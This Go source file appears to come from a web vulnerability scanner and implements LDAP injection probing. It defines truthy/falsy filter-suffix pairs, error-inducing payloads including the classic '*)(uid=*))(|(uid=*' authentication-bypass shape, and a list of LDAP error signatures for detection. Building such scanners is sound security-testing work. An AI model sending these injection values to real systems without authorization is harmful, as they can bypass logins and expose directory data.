package injection

import (
	"bytes"

	"github.com/londonmax12/hyperz/internal/lua_engine"
)

// ldapiCanaryPlaceholder marks the slot in a falsy template where the
// per-pair canary is rendered. Hard-coded rather than computed so the
// payload definitions read as plain strings.
const ldapiCanaryPlaceholder = "{{CANARY}}"

// ldapiBooleanPair is one truthy/falsy injection pair. Both variants are
// suffixes appended onto sink.Value: the goal is "if vulnerable, truthy
// matches baseline; if vulnerable, falsy matches nothing." The truthy
// suffix is a literal string; the falsy suffix carries
// ldapiCanaryPlaceholder so each pair gets a fresh per-invocation canary
// (so an attacker replaying the request can't pre-populate a directory
// entry that satisfies the AND and confuses the oracle).
type ldapiBooleanPair struct {
	Name     string
	Truthy   string
	FalsyTpl string
}

// ldapiBooleanPairs covers the dominant filter-template shapes:
//
//   - and-objectclass: AND/OR over the operational attribute
//     `objectClass`, which is mandatory on every directory entry, so
//     `objectClass=*` is always-true and `objectClass=<canary>` is
//     always-false. Fits AND-template filters like
//     `(&(uid=USER)(active=1))` - the rebuilt filter still matches the
//     original entry on truthy, collapses to no rows on falsy.
//   - and-cn: same shape but targets `cn`, which appears in directory-
//     services templates where `objectClass` is not in the search base.
var ldapiBooleanPairs = []ldapiBooleanPair{
	{
		Name:     "and-objectclass",
		Truthy:   ")(|(objectClass=*",
		FalsyTpl: ")(&(objectClass=" + ldapiCanaryPlaceholder,
	},
	{
		Name:     "and-cn",
		Truthy:   ")(|(cn=*",
		FalsyTpl: ")(&(cn=" + ldapiCanaryPlaceholder,
	},
}

// ldapiErrorPayloads are wire suffixes engineered to break LDAP filter
// parsing on the server. They cover the dominant failure paths:
// unbalanced parens, a lone backslash (escape character with no hex
// digit pair to follow), the empty-operand filter `(|`, and the classic
// auth-bypass shape that some lenient parsers accept and others reject
// loudly. Each is appended to sink.Value so numeric / string contexts
// both surface the payload to the parser.
var ldapiErrorPayloads = []string{
	`(`,
	`)(`,
	`\`,
	`*)(|`,
	`(|(uid=*)`,
	`*)(uid=*))(|(uid=*`,
}

// ldapErrorPatterns are lowercase substrings of LDAP error signatures
// across the major runtimes. Caller lowercases body before matching.
// Curated to cover the dominant LDAP stacks (OpenLDAP, JNDI, ldapjs,
// python-ldap, go-ldap, php-ldap, .NET DirectoryServices) without
// overlapping into generic English - "protocol error", for example, is
// too noisy to include without the surrounding "ldap" qualifier.
var ldapErrorPatterns = []string{
	"javax.naming.directoryexception",
	"javax.naming.namenotfoundexception",
	"javax.naming.invalidsearchfilterexception",
	"javax.naming.namingexception",
	"com.sun.jndi.ldap",
	"ldap_search_ext",
	"ldap_search_s",
	"ldap_search:",
	"ldap_first_entry",
	"ldap result code",
	"ldap error code",
	"ldaperr:",
	"ldaperror",
	"ldap_bind:",
	"ldap.invalidfiltersyntax",
	"ldapinvalidfiltersyntax",
	"invalid filter syntax",
	"invalid dn syntax",
	"bad search filter",
	"bad filter syntax",
	"unbalanced parenthesis",
	"unmatched parenthesis",
	"system.directoryservices.protocols",
	"directoryservicescomexception",
	"the search filter is invalid",
	"net::ldap::error",
	"ldap: search error",
	"ldap: filter is invalid",
}

// ldapiSinkProbable reports whether sink.Loc carries LDAP-filter-
// concatenation risk. Query, form, JSON, and path values commonly flow
// into search filters (login forms, user lookup endpoints, directory
// search). Headers and cookies are not used to construct LDAP filters
// in practice, so probing them would just waste requests.
func ldapiSinkProbable(s lua_engine.Sink) bool {
	switch s.Loc {
	case lua_engine.LocQuery, lua_engine.LocForm, lua_engine.LocJSON, lua_engine.LocPath:
		return true
	}
	return false
}

// matchLDAPErrors returns every ldapErrorPatterns entry that appears in
// body. Body is lowercased once per call so substring scans are case-
// insensitive without per-pattern allocations.
func matchLDAPErrors(body []byte) []string {
	if len(body) == 0 {
		return nil
	}
	lower := bytes.ToLower(body)
	var hits []string
	for _, pat := range ldapErrorPatterns {
		if bytes.Contains(lower, []byte(pat)) {
			hits = append(hits, pat)
		}
	}
	return hits
}
